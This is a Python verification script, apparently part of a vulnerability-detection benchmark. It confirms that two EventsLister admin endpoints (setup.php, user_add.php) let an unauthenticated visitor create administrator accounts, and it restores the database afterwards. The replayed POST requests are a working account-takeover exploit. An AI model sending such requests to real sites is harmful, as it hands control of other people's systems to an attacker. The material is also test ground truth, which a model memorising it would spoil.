"""Manual ground-truth verification for EventsLister (GT-027 .. GT-028).

Both admin endpoints contain no authentication check at all. GT-027 simulates
the fresh-install precondition (admin row cleared, restored afterwards) so the
visitor-triggered administrator-account setup is observable; the database is
restored from the per-record baseline in any case.
"""

from __future__ import annotations

import json

import verifier as v

APP = "events_lister"


def gt027(det, db) -> dict:
    """admin/setup.php — visitor executes the database/administrator-account
    setup: recreates the admin account with attacker-chosen credentials and
    inserts the test event."""
    r = v.Recorder(APP, "GT-027", db)
    tok = v.token("setupadmin")
    original_admin = db.rows("SELECT id, uname, pword FROM admin WHERE id=1")
    events_before = db.scalar("SELECT COUNT(*) FROM events")
    # Fresh-install precondition so the setup INSERT (which hard-codes id=1)
    # can succeed; the baseline restore reverts everything afterwards.
    db.execute("DELETE FROM admin WHERE id=1")
    r.add("instrument", {"table": "admin", "cleared_row": original_admin,
                         "events_before": events_before,
                         "note": "admin id=1 cleared to simulate fresh-install precondition"})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "admin/setup.php", {
            "method": "POST",
            "params": {
                "uname": f"{tok}@example.test",
                "pword": "12345678",
                "test_event": "yes",
                "submit": "Setup the database",
            },
            "referer": "admin/setup.php",
        })
        admin_after = db.scalar("SELECT uname FROM admin WHERE id=1")
        admin_created = (admin_after == f"{tok}@example.test")
        events_after = db.scalar("SELECT COUNT(*) FROM events")
        test_event_rows = db.scalar("SELECT COUNT(*) FROM events WHERE event='Test Event'")
        success_message = "inserted successfuly" in resp["body"]
        body_file = r.save_body("gt027_visitor_setup", resp["body"])
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "POST admin/setup.php uname=<token>@example.test test_event=yes",
            "status_code": resp["status_code"],
            "success_message_in_response": success_message,
            "admin_id1_uname_after": admin_after,
            "admin_account_created_by_visitor": admin_created,
            "events_before": events_before,
            "events_after": events_after,
            "test_event_rows": test_event_rows,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if admin_created else "not_confirmed"
    summary = (f"visitor POST admin/setup.php returned {resp['status_code']}; visitor recreated the "
               f"administrator account id=1 with attacker-chosen email (created={admin_created}) and the "
               f"setup inserted a Test Event row (events {events_before}->{events_after}); baseline restored afterwards.")
    return r.finish(verdict, summary)


def gt028(det, db) -> dict:
    """admin/user_add.php — visitor creates a new administrator account
    (token row appears in the admin table)."""
    r = v.Recorder(APP, "GT-028", db)
    tok = v.token("addadmin")
    r.add("instrument", {"table": "admin", "token_email": f"{tok}@example.test"})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "admin/user_add.php", {
            "method": "POST",
            "params": {
                "uname": f"{tok}@example.test",
                "pword": "12345678",
                "submit": "Add user",
            },
            "referer": "admin/user_add.php",
        })
        row = db.scalar(f"SELECT id FROM admin WHERE uname='{tok}@example.test' LIMIT 1")
        created = bool(row)
        body_file = r.save_body("gt028_visitor_user_add", resp["body"])
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "POST admin/user_add.php uname=<token>@example.test",
            "status_code": resp["status_code"],
            "admin_row_created_id": row or None,
            "created": created,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if created else "not_confirmed"
    summary = (f"visitor POST admin/user_add.php returned {resp['status_code']}; a new administrator "
               f"account row (id={row}, uname={tok}@example.test) was created without any login "
               f"(created={created}).")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt027, gt028):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:130]}")


if __name__ == "__main__":
    main()
